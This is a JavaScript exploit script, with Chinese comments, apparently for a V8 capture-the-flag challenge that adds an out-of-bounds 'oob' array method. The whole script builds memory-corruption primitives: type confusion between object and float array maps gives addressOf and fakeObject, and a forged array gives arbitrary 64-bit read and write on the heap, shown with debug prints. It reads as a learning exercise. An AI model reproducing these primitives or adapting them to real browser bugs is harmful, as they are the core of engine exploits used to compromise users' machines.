var buf = new ArrayBuffer(16)
var float64 = new Float64Array(buf)
var bigUint64 = new BigUint64Array(buf)

function f2i(f) // 将浮点数转成整数
{
	float64[0] = f;
	return bigUint64[0];
}

function i2f(i) // 将整数转成浮点数
{
	bigUint64[0] = i;
	return float64[0];
}
//两个数组操作同一片内存，实现64位浮点数与64位整数之间的转换
function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];

var obj_array_map = obj_array.oob();
var float_array_map = float_array.oob();

function addressOf(obj) // obj -> float addr
{
	obj_array[0] = obj;
	obj_array.oob(float_array_map);// 将obj_array类型变成float型
	
	var object_addr = obj_array[0];// 这样就会将第一个对象地址当成浮点数输出
	obj_array.oob(obj_array_map); // 将obj_array类型复原
	return f2i(object_addr)-1n; // 得到的是指针，所以需要减1才是真实地址
}
//如果未将obj_array类型变成float型，直接输出，输出的是 0x7ff7ffffffffffff。
function fakeObject(addr) // float addr -> obj
{
	var obj_addr = i2f(addr + 1n); // +1变成指针
	float_array[0] = obj_addr;     // 将地址存入float_array[0]，并修改float_array类型为obj array
	float_array.oob(obj_array_map);

	var fake_object = float_array[0];//这样就会将传入的地址当成是一个对象的地址
	float_array.oob(float_array_map); // 将数组类型还原
	return fake_object;
}

var fake_array = [
	float_array_map,
	i2f(0n),
	i2f(0x41414141n),
	i2f(0x1000000000n),
	1.1,
	2.2
];

%DebugPrint(fake_array); // fake array map address
var fake_array_addr = addressOf(fake_array);
var fake_object_addr = fake_array_addr - 0x40n + 0x10n;
var fake_object = fakeObject(fake_object_addr);


function read64(addr)
{
	fake_array[2] = i2f(addr + 0x1n - 0x10n);// 传入地址+1变成指针，因为elements属性前面还有map和length占0x10个字节，所以要先扣除
	var leak_info = f2i(fake_object[0]);
	console.log("[*] leak addr: 0x" + hex(addr) + " data: 0x" + hex(leak_info));
	return leak_info;
}

function write64(addr, data)
{
	fake_array[2] = i2f(addr + 0x1n - 0x10n);
	fake_object[0] = i2f(data);
	console.log("[*] write data to addr: 0x" + hex(addr) + " data: 0x" + hex(data));
}

var a = [1.1, 2.2, 3.3];
%DebugPrint(a);
var a_addr = addressOf(a);
console.log("[*] addressOf a: 0x" + hex(a_addr));
read64(a_addr);
%SystemBreak();
write64(a_addr, 0x01020304n);
%SystemBreak();
